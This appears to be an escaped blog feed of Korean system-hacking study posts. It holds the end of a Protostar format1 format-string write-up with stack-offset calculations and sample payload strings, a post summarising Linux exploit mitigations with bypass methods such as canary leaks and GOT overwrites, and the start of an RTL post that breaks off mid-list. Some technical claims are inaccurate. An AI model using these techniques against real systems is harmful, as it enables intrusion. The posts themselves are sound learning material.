&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x10&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; 의 위치인 것을 확인했다. 이중배열답게 두 번 참조한 모습이다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe088&lt;/code&gt; 의 바로 다음 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe090&lt;/code&gt; 일 것이다. 그리고 해당 주소에 담긴 값이 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 일 테다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3f0&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv[1][0]&lt;/code&gt; 의 주소임을 확인했다. 해당 주소에 정말로 내가 인자로 입력했던 문자열이 저장되어 있는지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;확인 완료!&lt;/p&gt;

&lt;p&gt;현재 ASLR이 꺼져 있기 때문에, 스택의 위치는 고정이다. 따라서 앞서 확인했던 ‘스택이 참조될 때 가장 먼저 참조되는 주소’는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt; 으로 고정일 것이다.&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt; 에서부터 시작해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3e8&lt;/code&gt; 까지를 참조해야 마지막에 올 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3f0&lt;/code&gt; 을 참조할 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffe3e8&lt;/code&gt;  -  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7fffffffdf80&lt;/code&gt;)/8 = 141이다. 메모리 한 주소가 1byte짜리이기 때문에 1byte씩을 읽어 오는 포맷 스트링 몇 개가 필요한지 알아내기 위해 8로 나누었다.&lt;/p&gt;

&lt;p&gt;즉, 만약 5개의 레지스터 + 142개의 주소를 읽어 온다면 맨 마지막에 내가 입력해준 문자열인 ‘AAAAAAAA’가 확인될 것이다. 예상이 맞는지 직접 프로그램에 인자를 주어 실행해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;어? 내 입력값을 읽어온 건 맞는데…. 처음 4바이트가 잘렸다. 왜지?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아하… 입력값 길이가 달라지면 문자열의 시작 주소도 달라지는 모양이다.(이걸 보고 스택의 높이가 변한다고 하고(참), root 계정으로 파이썬 익스플로잇을 만들어야 스택의 높이가 변하지 않는다고 하더라(확인되지 않음. 정말 카더라임) )&lt;/p&gt;

&lt;p&gt;시작 주소 차이가 -3만큼 나고 문자열의 길이 차이가 +3만큼 나는 걸 생각하면 끝 주소를 고정해 놓은 것으로 추측된다. 그렇다면 어차피 근사한 위치이기 때문에 실제 익스플로잇 페이로드를 넣어보면서 오차를 좁히는 것이 가장 효율적인 방안일 것이다.&lt;/p&gt;

&lt;p&gt;충분히 수학적으로 계산해서 정확하게 읽어야 할 주소의 개수를 구할 수 있을 것 같은데 왜 굳이 삽질을 하냐는 의문이 들 수 있다. 그런데 계산이 더 삽질이다… 마지막에 서술해 두었다.&lt;/p&gt;

&lt;p&gt;아무튼, 근사치를 구해 보면,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아무래도 뒤의 A 4개 대신 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;의 주소를 넣는 게 맞을 것 같다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;의 주소는 objdump를 떠서도 구할 수 있는데, 나는 pwndbg를 이용해 구했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0060103c&lt;/code&gt;인 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;64비트 환경에서 포인터 타입의 데이터는 1byte로 인식되기 때문에, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x000000000060103c&lt;/code&gt; 를 입력값으로 넣을 수 있도록…. 했는데&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;불가능하다는 것을 확인받았다. argument로 null byte를 전달하는 방법이… 없더라… input으로 전달이라면 얼마든지 어떻게든 해볼 수 있었겠지만 argument로 전달하는 건 진짜 안 되더라. 다른 분들께 물어보니 그건 0이 필수로 포함되는 64비트 환경에서는 안 되는 문제라는 답을 받을 수 있었다.&lt;/p&gt;

&lt;p&gt;그치만 이 문제를 64비트에서 해결하실 수 있는 분… 꼭 연락 주세요. 분명히 방법이 있을 텐데….
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-논외-수학적으로-읽어야-할-주소-개수-구하기를-시도했는데-고려한-변수가-한두개가-아니라-포기한-건에-대하여&quot;&gt;3. 논외-수학적으로 읽어야 할 주소 개수 구하기를 시도했는데 고려한 변수가 한두개가 아니라 포기한 건에 대하여&lt;/h1&gt;

&lt;p&gt;웹소설 제목 st 소제목 기막히죠&lt;/p&gt;

&lt;p&gt;length=x(null 제외) 문자열을 넣었을 때&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;문자열의 끝 주소: 0x7fffffffe401인데 null이 여기 오는 거 감안하면 0x7fffffffe400을 끝 주소로 봐도 무방함&lt;/p&gt;

&lt;p&gt;따라서 문자열의 시작 주소는 0x7fffffffe400-(x-1)&lt;/p&gt;

&lt;p&gt;{0x7fffffffe400-(x-1) - 0x7fffffffdf80}/8 = 문자열의 시작 주소까지 읽어야 하는 주소의 수&lt;/p&gt;

&lt;p&gt;{1152-(x-1)}/8 = 144-(x-1)/8&lt;/p&gt;

&lt;p&gt;따라서 입력한 문자열이 null byte 제외 x글자일 때, 해당 문자열의 시작이 나오도록 하기 위해 읽어야 하는 주소의 수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;144-(x-1)/8&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;예를 들어 ‘AAAAAAAA..%5$x..%{3자리_수}$p…’ 면 25글자이기 때문에 들어가야 하는 3자리 수는 144-(25-1)/8 = 144-24/8 = 144-3 = 141 이다.&lt;/p&gt;

&lt;p&gt;즉, ‘AAAAAAAA..%5$x..%141$p…’ 를 입력해야 한다.&lt;/p&gt;

&lt;p&gt;그러나 논리상 맞는데 이상하게 오차가 생겼다. 왜인지 확인해 보니…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;입력값 길이가 달라지면… 달라진 입력값 길이/8 을 올림한 만큼…. 스택은 더 위로 이동하는 것 같았다. 이곳저곳에 조언을 구해 보니, 입력값이 늘어나면 늘어날수록 시스템이 더 큰 공간을 할당해 주고, 거기에 문제가 없도록 여유 공간 또한 주기 때문에 스택 프레임의 위치가 더 위로 이동하게 된다고 하더라. (아래 그림과 위 그림 비교)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/format1/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그래서 그것까지 계산하느니 그냥 근사값 가지고 때려 맞추는 게 더 나을 것 같아서 수학적 계산은 그만뒀다.&lt;/p&gt;
</description>
        <pubDate>Tue, 06 Dec 2022 00:20:58 +0900</pubDate>
        <link>http://localhost:4000/blog/system_hacking/protostar-format1/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system_hacking/protostar-format1/</guid>
      </item>
    
      <item>
        <title>Memory Exploit Mitigations and How to Bypass them 01</title>
        <description>&lt;p&gt;아직 윈도우 메모리 보호 기법은 다루지 못했다. 또한 다음 포스트로는 보호 기법 우회 실습을 다루려 한다.&lt;/p&gt;

&lt;h1 id=&quot;0-memory-exploit-mitigation-techniques&quot;&gt;0. Memory Exploit Mitigation Techniques&lt;/h1&gt;

&lt;h2 id=&quot;01-linux&quot;&gt;0.1. Linux&lt;/h2&gt;

&lt;p&gt;이어 말할 메모리 보호 기법을 더 잘 이해하기 위해 리눅스의 프로세스 메모리 구조를 명시한다.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;.code(.text): RE&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.rodata: R, 상수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.data: RW, 초기화한 전역 변수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;.bss: RW, 초기화 되기 전의 전역 변수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;heap: RW, 동적으로 메모리를 할당할 때 사용&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;stack: RW, 지역 변수 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OS Kernel Space&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;(Low to High address)
.bss 영역에 있던 초기화 되기 전의 전역 변수들은 main이 실행되기 전에 0으로 초기화되어 .data 영역에 저장된다.&lt;/p&gt;

&lt;h3 id=&quot;011-aslraddress-space-layout-randomization&quot;&gt;0.1.1. ASLR(Address Space Layout Randomization)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;공유 라이브러리, 스택 및 힙, 실행 파일의 베이스가 매핑되는 메모리 영역의 주소를 Randomization 한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;공격자가 공격에 필요한 정확한 메모리 주소를 알아내 공격에 사용하는 것을 막아주는 기법이다. 리눅스에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;randomize_va_space&lt;/code&gt; 파일에 int 값으로 옵션이 저장되는데, 이 값이 0일 경우 해제, 1일 경우 스택과 라이브러리 랜덤화, 2일 경우 스택, 라이브러리 및 힙까지 랜덤화를 할 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;012-ascii-armor&quot;&gt;0.1.2. ASCII-Armor&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;공유 라이브러리 매핑 시, 주소값의 상위 1바이트를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt;이 되도록 배치한다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt; 은 ASCII로 NULL을 의미한다. 보통 문자열 관련 함수들은 NULL 문자를 문자의 끝이라고 인식하기 때문에, ASCII-Armor는 문자열 관련 함수를 이용한 라이브러리 주소 편집/사용이 불가능해지게 만든다. 따라서, RTL과 같이 라이브러리 주소를 이용한 공격을 까다롭게 만든다.&lt;/p&gt;

&lt;h3 id=&quot;013-fortify_source&quot;&gt;0.1.3. FORTIFY_SOURCE&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;strcpy, memset과 같은 메모리 버퍼 관련 함수 실행 시, 기존 함수 대신 src와 dst의 크기를 비교하는 검사를 수행하는 빌트인 함수로 대체해 실행시킨다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;입력값이 저장될 위치의 크기와 입력값의 크기를 비교하는 것이므로, SSP와 달리 스택에 할당되지 않은 변수에 대한 오버플로우 검사가 가능하다.&lt;/p&gt;

&lt;p&gt;적용하기 위해서는 gcc 컴파일 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-D_FORTIFY_SOURCE=N&lt;/code&gt; 옵션을 추가해야 하고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-O1&lt;/code&gt; 이상의 최적화 옵션도 추가해 주어야 한다.&lt;/p&gt;

&lt;h3 id=&quot;014-nx-bitno-execute-bit&quot;&gt;0.1.4. NX-bit(No-eXecute bit)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;데이터 영역의 메모리 페이지를 NX 특성으로 지정해 BOF를 이용한 쉘코드 실행 공격을 불가능하게 만든다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;리눅스의 프로세스 메모리 5개 영역 중, 코드 영역과 데이터 영역의 실행 권한을 명확하게 분리하려는 정책이다.&lt;/p&gt;

&lt;h3 id=&quot;015-pieposition-independent-executable&quot;&gt;0.1.5. PIE(Position Independent Executable)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로그램의 바이너리 코드가 매핑되는 메모리 영역이 매번 달라지게 하는 기법이다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;따라서, plt나 got 영역에 접근해 라이브러리 함수의 절대 주소를 알아내 익스플로잇에 이용하는 기존 기법이 어려워졌다. 또한 코드 영역의 주소가 실행될 때마다 변화하므로 ROP 등의 코드 재사용 공격을 막을 수 있다.&lt;/p&gt;

&lt;p&gt;컴파일러가 제공하는 보안 기능이기 때문에, 컴파일러 옵션으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-no-pie&lt;/code&gt;를 주어서 끌 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;016-relrorelocation-read-only&quot;&gt;0.1.6. RELRO(RELocation Read-Only)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ELF binary의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; 섹션을 RO로 설정해 데이터 섹션의 보안을 강화하는 보호기술&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;Relocation Table이란 프로그램이 실행되기 위해 어느 부분에 relocation이 필요한지 보관하고 있는 영역으로, 라이브러리 함수의 주소를 담고 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 등이 이에 해당된다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Partial RELRO-Lazy Binding
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamic&lt;/code&gt; 영역의 쓰기 권한을 없애 버린다.
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamic&lt;/code&gt; 영역이란?
            &lt;ul&gt;
              &lt;li&gt;오브젝트 파일(소스)가 dynamic linking을 사용하면 해당 파일의 elf header 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PT_DYNAMIC&lt;/code&gt; 타입의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; 이라는 섹션이 생기는데, 이때 해당 섹션에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_DYNAMIC&lt;/code&gt; 이라는 심볼이 붙는다.&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_DYNAMIC&lt;/code&gt; 섹션 안에는 함수 엔트리를 가리키는 포인터가 있다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ELF Header에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RELRO&lt;/code&gt; 영역이 생기고, 해당영역의 권한은 RO이다.
        &lt;ul&gt;
          &lt;li&gt;해당 영역에 포함되는 Section은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INIT_ARRAY&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FINI_ARRAY&lt;/code&gt; 이다.&lt;/li&gt;
          &lt;li&gt;즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; 에 속하지 않는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 섹션은 덮어쓸 수 있다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Full RELRO-Now Binding
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt; section 이외 모든 영역의 쓰기 권한이 없어진다.&lt;/li&gt;
      &lt;li&gt;ELF Header에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RELRO&lt;/code&gt; 영역이 생기고, 해당 영역의 권한은 RO이다.
        &lt;ul&gt;
          &lt;li&gt;해당 영역에 포함되는 Section은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INIT_ARRAY&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FINI_ARRAY&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PLTGOT&lt;/code&gt; 이다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Section 영역에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PLTRELSZ&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PLTREL&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JMPREL&lt;/code&gt; 이 제거되고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BIND_NOW&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAGS_1&lt;/code&gt; 섹션이 추가된다.&lt;/li&gt;
      &lt;li&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 섹션을 덮어쓸 수 없다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;017-sspstack-smashing-protector&quot;&gt;0.1.7. SSP(Stack Smashing Protector)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Stack Smashing, 즉 스택을 violating하는 스택 버퍼 오버플로우를 막기 위해 고안된 방식이다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;보통은 Stack Canary라고 부른다.&lt;/p&gt;

&lt;p&gt;함수가 실행될 때 스택의 RBP와 RET 사이에 랜덤으로 생성된 Canary를 삽입한다. Canary 가 변조된 것이 확인되면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_chk_fail&lt;/code&gt; 함수가 호출되면서 프로그램이 종료되기 때문에, RET 변조를 이용한 공격을 방어할 수 있다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-how-to-bypass-them&quot;&gt;1. How to Bypass them&lt;/h1&gt;

&lt;h2 id=&quot;01-linux-1&quot;&gt;0.1. Linux&lt;/h2&gt;

&lt;h3 id=&quot;011-aslraddress-space-layout-randomization-1&quot;&gt;0.1.1. ASLR(Address Space Layout Randomization)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Address Leak: 가장 현실적&lt;/li&gt;
  &lt;li&gt;ASLR Bypass Brute-Force attack&lt;/li&gt;
  &lt;li&gt;NOP Sled&lt;/li&gt;
  &lt;li&gt;Heap Spraying&lt;/li&gt;
  &lt;li&gt;RTL using Symbolic Link&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;012-ascii-armor-1&quot;&gt;0.1.2. ASCII-Armor&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;RTL: 쓰레기값에 심볼릭 링크를 거는 방식의 RTL(Omega Project)&lt;/li&gt;
  &lt;li&gt;Chainning RTL&lt;/li&gt;
  &lt;li&gt;PLT &amp;amp; GOT Overwrite&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;013-fortify_source-1&quot;&gt;0.1.3. FORTIFY_SOURCE&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;입력값이 저장될 위치의 크기를 알 수 없다면 아무런 검사를 수행할 수 없기 때문에 빌트인 함수가 아닌 원본의 라이브러리 함수로 변경된다.&lt;/li&gt;
  &lt;li&gt;즉, 전달되는 크기 정보를 망가뜨려 버리거나 저장될 위치의 크기를 알 수 없다는 뜻의 플래그를 리턴하도록 한다면 얼마든지 회피할 수 있다.&lt;/li&gt;
  &lt;li&gt;한 예로, 저장 위치 포인터가 함수 호출을 통해 함수 간에 전달된다면 크기 정보가 모두 사라지는 이유로 검사 수행이 불가능하기 때문에 우회 가능해진다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;014-nx-bit&quot;&gt;0.1.4. NX-bit&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;RTL: RX 권한들이 동시에 존재하는 메모리 영역이 없기 때문에, 프로그램에 스택 버퍼 오버플로우 취약점이 존재하는 경우 X 권한이 있는 메모리 페이지에 위치한 코드들을 걸치면서 이동해 코드 플로우를 바꾸는 방식으로 익스플로잇할 수 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;015-pieposition-independent-executable-1&quot;&gt;0.1.5. PIE(Position Independent Executable)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;코드 영역의 주소를 알아내는 것이 우선이다. 특정 코드 영역의 주소를 leak한 이후, 구한 주소를 이용해 베이스 주소를 구할 수 있다. 이렇게 구한 코드 베이스 주소에 대해 오프셋 계산을 함으로써 여타 시스템 함수들의 주소를 구할 수 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;016-relrorelocation-read-only-1&quot;&gt;0.1.6. RELRO(RELocation Read-Only)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Partial RELRO
    &lt;ul&gt;
      &lt;li&gt;plt, got는 보호받지 못하기 때문에 PLT&amp;amp;GOT Overwriting이 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Full RELRO
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ctors&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dtors&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.jcr&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 등의 영역에 RO가 설정되기 때문에, 그냥 이 영역들을 쓰지 않으면 쉽게 익스플로잇이 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;017-sspstack-smashing-protector-1&quot;&gt;0.1.7. SSP(Stack Smashing Protector)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Canary Leak: 가장 현실적! 함수의 프롤로그에서 스택에 카나리 값을 저장하므로, 이를 읽어낼 수 있다면 카나리와 똑같은 값을 오버플로우 페이로드에 집어넣어 우회할 수 있다.&lt;/li&gt;
  &lt;li&gt;TLS(Thread Local Storage) 접근: 카나리 값이 프로세스가 시작될 때 TLS에 전역변수로 저장되고, 각 함수마다 프롤로그와 에필로그에서 이 값을 참조하기 때문에 TLS 주소를 Leak 한다면 카나리의 값을 알아내거나 조작할 수 있다.&lt;/li&gt;
  &lt;li&gt;Brute Forcing Attack: 사실상 불가능하다.&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Tue, 22 Nov 2022 00:08:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system_hacking/memory-exploit-mitigation-bypass-01/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system_hacking/memory-exploit-mitigation-bypass-01/</guid>
      </item>
    
      <item>
        <title>Protostar-stack5.c x86 &amp; x86-64</title>
        <description>&lt;p&gt;학교 수업에서 풀이한 문제 중 하나로, x86에서의 RTL과 x86-64에서의 RTL을 모두 실습하기에 좋은 문제인 것 같아 블로그에 기록해본다.&lt;/p&gt;

&lt;p&gt;사실 이 문제는 BOF로 쉘코드를 넣으라고 만들어준 문제이긴 하지만, 1) 마음대로 RTL을 하기에도 괜찮아 보이고 2) 32bit로 컴파일 시 메인 함수의 에필로그가 달라지는 문제가 있기에 해결해 보고 싶어 선택했다.&lt;/p&gt;

&lt;hr /&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;0-x86에서의-rtl과-x64에서의-rtl&quot;&gt;0. X86에서의 RTL과 X64에서의 RTL&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;01-rtl이란&quot;&gt;0.1. RTL이란&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;RTL 이란 Return 2 Library(or Libc)의 약자로, 프로그램 실행 시 해당 언어로 짜인 코드에는 필수적으로 포함되는 라이브러리가(gcc 컴파일러의 경우 libc) 함께 메모리에 로딩되는 점을 악용하여 프로세스 플로우를 해당 라이브러리 내의 원하는 함수로 변경시켜 시스템이 공격자가 원하는 행위를 하도록 조작하는 공격 기법을 의미한다.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;윈도우의 경우 RTL은 DEP가 설정되어 있어 스택에서 코드 실행이 불가능할 경우 사용된다.&lt;/li&gt;
    &lt;li&gt;DEP는 윈도우의 스택 내 코드 실행 방지를 위한 보안 정책인데, Linux Stack Canary의 윈도우 버전인 Stack Cookie와는 다르다. 오히려 Linux의 NX-bit와 좀 더 겹친다고 보는 게 맞다.
      &lt;ul&gt;
        &lt;li&gt;Windows XP SP2와 Windows 2003 SP1에서부터 추가된 기능으로, 웜바이러스의 BOF 익스플로잇 과정(data 영역인 Thread stack을 공격)을 차단하는 것이 목적이었다.&lt;/li&gt;
        &lt;li&gt;가상 메모리 영역을 ‘실행 불가’ 상태로 처리하고, 여기에서 코드가 실행되고자 한다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_ACCESS_VIOLATION&lt;/code&gt; 예외를 발생시킴으로써 프로세스를 Kill 하는 것이 기본 원리이다.&lt;/li&gt;
        &lt;li&gt;위의 원리를 위해 가상메모리 페이지 옵션에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_READ&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_WRITECOPY&lt;/code&gt; 플래그를 추가했다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;DEP에는 소프트웨어가 제공하는 DEP와 하드웨어가 제공하는 DEP가 있다.
      &lt;ul&gt;
        &lt;li&gt;하드웨어 DEP는 메모리를 페이지 단위에서 실행 불가능으로 처리해 CPU에게 넘기는 방식이다.&lt;/li&gt;
        &lt;li&gt;소프트웨어 DEP는 데이터 페이지 부근에서의 코드 실행을 막지는 못하지만 SEH 덮어쓰기 등의 공격은 막을 수 있다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-요점&quot;&gt;0.2. 요점&lt;/h2&gt;

&lt;ol&gt;
